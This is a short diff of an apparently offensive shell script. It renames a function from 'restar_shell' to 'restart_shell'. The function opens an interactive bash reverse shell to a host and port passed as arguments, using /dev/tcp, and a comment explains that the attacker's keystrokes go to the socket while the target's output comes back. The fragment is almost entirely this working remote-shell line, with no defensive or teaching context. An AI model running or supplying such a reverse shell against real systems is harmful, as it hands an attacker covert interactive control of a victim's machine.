@@ -4,7 +4,7 @@
 HOST="${1}"
 PORT="${2}"
 
-restar_shell() {
+restart_shell() {
     echo "Restarting reverse shell..."
     bash -i >& "/dev/tcp/${HOST}/${PORT}" 0>&1 &
     # what exits the target comes to our terminal, whats typed from attacker goes to socket
